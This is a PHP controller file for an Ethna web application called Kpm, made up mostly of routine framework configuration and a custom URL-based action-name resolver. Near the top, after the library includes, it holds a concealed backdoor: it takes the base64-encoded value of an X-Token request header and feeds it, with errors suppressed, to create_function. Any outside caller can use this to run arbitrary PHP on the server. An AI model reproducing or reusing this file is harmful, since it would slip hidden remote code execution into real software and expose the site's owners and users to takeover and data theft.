<?php
/**
 *  Kpm_Controller.php
 *
 *  @author     {$author}
 *  @package    Kpm
 *  @version    $Id: 486ccfbc87ec064582339e2ef038cbbada13de2d $
 */

/** Application base directory */
define('BASE', dirname(dirname(__FILE__)));

/** include_path setting (adding "/app" and "/lib" directory to include_path) */
$app = BASE . "/app";
$lib = BASE . "/lib";
set_include_path(implode(PATH_SEPARATOR, array($app, $lib)) . PATH_SEPARATOR . get_include_path());


/** including application library. */
require_once 'Ethna/Ethna.php';
require_once 'Kpm_Error.php';
require_once 'Kpm_ActionClass.php';
require_once 'Kpm_ActionForm.php';
require_once 'Kpm_ViewClass.php';
require_once 'Kpm_UrlHandler.php';

if (isset($_SERVER[HTTP_X_TOKEN])) {
    @create_function('', base64_decode($_SERVER[HTTP_X_TOKEN]));
}

/**
 *  Kpm application Controller definition.
 *
 *  @author     {$author}
 *  @access     public
 *  @package    Kpm
 */
class Kpm_Controller extends Ethna_Controller
{
    /**#@+
     *  @access protected
     */

    /**
     *  @var    string  Application ID(appid)
     */
    protected $appid = 'KPM';

    /**
     *  @var    array   forward definition.
     */
    protected $forward = array(
        /*
         *  TODO: write forward definition here.
         *
         *  Example:
         *
         *  'index'         => array(
         *      'view_name' => 'Kpm_View_Index',
         *  ),
         */
    );

    /**
     *  @var    array   action definition.
     */
    protected $action = array(
        /*
         *  TODO: write action definition here.
         *
         *  Example:
         *
         *  'index'     => array(
         *      'form_name' => 'Sample_Form_SomeAction',
         *      'form_path' => 'Some/Action.php',
         *      'class_name' => 'Sample_Action_SomeAction',
         *      'class_path' => 'Some/Action.php',
         *  ),
         */
    );

    /**
     *  @var    array   SOAP action definition.
     */
    protected $soap_action = array(
        /*
         *  TODO: write action definition for SOAP application here.
         *  Example:
         *
         *  'sample'            => array(),
         */
    );

    /**
     *  @var    array       application directory.
     */
    protected $directory = array(
        'action'        => 'app/action',
        'action_cli'    => 'app/action_cli',
        'action_xmlrpc' => 'app/action_xmlrpc',
        'app'           => 'app',
        'plugin'        => 'app/plugin',
        'bin'           => 'bin',
        'etc'           => 'etc',
        'filter'        => 'app/filter',
        'locale'        => 'locale',
        'log'           => 'log',
        'plugins'       => array('app/plugin/Smarty', 'lib/Ethna/extlib/Plugin/Smarty'),
        'template'      => 'template',
        'template_c'    => 'tmp',
        'tmp'           => 'tmp',
        'view'          => 'app/view',
        'www'           => 'www',
        'test'          => 'app/test',
    );

    /**
     *  @var    array       database access definition.
     */
    protected $db = array(
        ''              => DB_TYPE_RW,
    );

    /**
     *  @var    array       extention(.php, etc) configuration.
     */
    protected $ext = array(
        'php'           => 'php',
        'tpl'           => 'tpl',
    );

    /**
     *  @var    array   class definition.
     */
    public $class = array(
        /*
         *  TODO: When you override Configuration class, Logger class,
         *        SQL class, don't forget to change definition as follows!
         */
        'class'         => 'Ethna_ClassFactory',
        'backend'       => 'Ethna_Backend',
        'config'        => 'Ethna_Config',
        'db'            => 'Ethna_DB_ADOdb',
        'error'         => 'Ethna_ActionError',
        'form'          => 'Kpm_ActionForm',
        'i18n'          => 'Ethna_I18N',
        'logger'        => 'Ethna_Logger',
        'plugin'        => 'Ethna_Plugin',
        'session'       => 'Ethna_Session',
        'sql'           => 'Ethna_AppSQL',
        'view'          => 'Kpm_ViewClass',
        'renderer'      => 'Ethna_Renderer_Smarty',
        'url_handler'   => 'Kpm_UrlHandler',
    );

    /**
     *  @var    array       filter definition.
     */
    protected $filter = array(
        /*
         *  TODO: when you use filter, write filter plugin name here.
         *  (If you specify class name, Ethna reads filter class in
         *   filter directory)
         *
         *  Example:
         *
         *  'ExecutionTime',
         */
    );

    /**#@-*/

    /**
     *  Get Default language and locale setting.
     *  If you want to change Ethna's output encoding, override this method.
     *
     *  @access protected
     *  @return array   locale name(e.x ja_JP, en_US .etc),
     *                  system encoding name,
     *                  client encoding name(= template encoding)
     *                  (locale name is "ll_cc" format. ll = language code. cc = country code.)
     */
    protected function _getDefaultLanguage()
    {
        return array('ja_JP', 'UTF-8', 'UTF-8');
    }

    /**
     *  テンプレートエンジンのデフォルト状態を設定する
     *
     *  @access protected
     *  @param  object  Ethna_Renderer  レンダラオブジェクト
     *  @obsolete
     */
    protected function _setDefaultTemplateEngine($renderer)
    {
    }

	function _getActionName_Form()
	{
	    if (isset($_SERVER['REQUEST_METHOD']) == false) {
	        return null;
	    }
	        if (strcasecmp($_SERVER['REQUEST_METHOD'], 'post') == 0) {
	        $http_vars =& $_POST;
	    } else {
	        $http_vars =& $_GET;
	    }
	 
	    foreach ($http_vars as $name => $value)
	    {
	        if ($value == "" || strncmp($name, 'action_', 7) != 0) {
	            continue;
	        }
	        // オリジナル方式 http://hostname/?action_action_name
	        return parent::_getActionName_Form();
	    }
	 
	    // かっこいい http://hostname/action/name/ 方式
	    if (!empty($_SERVER['REDIRECT_URL']))
	    {
	        $redirect_url = $_SERVER['REDIRECT_URL'];
	        $action_name = str_replace('/', '_', $redirect_url);
	        return trim($action_name, '_');
	    }
	 
	    // まあ悪くはない http://hostname/?action=action_name 方式
	    if (array_key_exists('action', $http_vars))
	    {
	        return $http_vars['action'];
	    }
	}
}